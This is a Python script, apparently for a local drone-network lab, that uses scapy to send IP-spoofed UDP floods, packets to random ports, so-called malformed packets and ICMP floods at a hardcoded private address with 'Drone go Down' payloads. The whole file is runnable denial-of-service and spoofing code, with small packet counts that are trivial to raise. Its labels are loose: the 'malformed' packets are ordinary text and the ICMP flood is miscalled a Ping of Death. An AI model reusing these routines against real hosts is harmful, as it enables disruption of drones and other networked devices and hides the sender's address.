import socket
import random
import os
from datetime import datetime
from scapy.all import *

def send_spoofed_packet(target_ip, target_port, spoofed_ip, num_packets, payload):
    """ Sends spoofed UDP packets. """
    for _ in range(num_packets):
        packet = IP(src=spoofed_ip, dst=target_ip) / UDP(dport=target_port, sport=RandShort()) / Raw(load=payload.encode())
        send(packet, verbose=0)  # verbose=0 to suppress output
        print(f"Spoofed packet sent from {spoofed_ip} to {target_ip}:{target_port}")

def send_attack_details(target_ip, port, attack_type, spoofed_ip, success, num_packets, payload):
    """ Sends details of the attack to main2.py using a spoofed IP """
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    message = f"{payload}"
    packet = IP(src=spoofed_ip, dst=target_ip) / UDP(dport=port, sport=RandShort()) / Raw(load=message.encode())
    send(packet, verbose=0)
    print(f"Details sent from spoofed IP {spoofed_ip} to {target_ip}:{port} - {message}")

def udp_flood_attack(target_ip, target_port, spoofed_ip, num_packets, message):
    """ Simulates a UDP flood attack. """
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        for i in range(num_packets):
            sock.sendto(message.encode(), (target_ip, target_port))
        print("UDP flood attack complete.")
    send_attack_details(target_ip, target_port, 'UDP Flood', spoofed_ip, True, num_packets, message)

def random_port_attack(target_ip, spoofed_ip, num_packets):
    """ Sends packets to random ports. """
    message = "Port scan attack!"
    for i in range(num_packets):
        target_port = random.randint(1024, 65535)
        send_spoofed_packet(target_ip, target_port, spoofed_ip, 1, message)
    print("Random port attack complete.")
    send_attack_details(target_ip, target_port, 'Random Port Attack', spoofed_ip, True, num_packets, message)

def malformed_packet_attack(target_ip, target_port, spoofed_ip, num_packets):
    """ Sends malformed packets. """
    malformed_message = "Attack Type: Malformed Packet Attack, Message: Drone go Down"
    for i in range(num_packets):
        send_spoofed_packet(target_ip, target_port, spoofed_ip, 1, malformed_message)
    print("Malformed packet attack complete.")
    send_attack_details(target_ip, target_port, 'Malformed Packet Attack', spoofed_ip, True, num_packets, malformed_message)

def icmp_flood_attack(target_ip, spoofed_ip, num_packets):
    """ Simulates an ICMP flood (Ping of Death). """
    icmp_message = "Attack Type: ICMP Flood, Message: Drone go Down"
    for i in range(num_packets):
        packet = IP(src=spoofed_ip, dst=target_ip) / ICMP() / Raw(load=icmp_message.encode())
        send(packet, verbose=0)
    print("ICMP flood attack complete.")
    send_attack_details(target_ip, 8080, 'ICMP Flood', spoofed_ip, True, num_packets, icmp_message)

if __name__ == "__main__":
    target_ip = "192.168.42.170"
    target_port = 8080
    spoofed_ip = "192.168.1.209"

    print("Starting UDP flood attack...")
    udp_flood_attack(target_ip, target_port, spoofed_ip, 10, "Attack Type: UDP flood attack, Message: Drone go Down")

    print("Starting random port attack...")
    random_port_attack(target_ip, spoofed_ip, 10)

    print("Starting malformed packet attack...")
    malformed_packet_attack(target_ip, target_port, spoofed_ip, 10)

    print("Starting ICMP flood attack...")
    icmp_flood_attack(target_ip, spoofed_ip, 10)

    print("All attacks completed. Exiting the program.")
